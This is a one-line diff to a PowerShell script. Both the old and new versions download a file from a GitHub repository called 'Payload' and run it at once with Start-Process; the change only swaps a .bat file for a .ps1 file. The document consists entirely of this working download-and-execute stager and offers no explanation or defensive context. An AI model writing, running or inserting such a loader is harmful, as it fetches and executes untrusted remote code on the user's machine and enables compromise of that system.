@@ -1,1 +1,1 @@
-$url = "https://raw.githubusercontent.com/Bonifyde/Payload/master/script.bat"; $dest = "script.bat"; $web = New-Object -TypeName System.Net.WebClient; $web.DownloadFile($url,$dest); Start-Process $dest
+$url = "https://raw.githubusercontent.com/Bonifyde/Payload/master/script.ps1"; $dest = "script.ps1"; $web = New-Object -TypeName System.Net.WebClient; $web.DownloadFile($url,$dest); Start-Process $dest
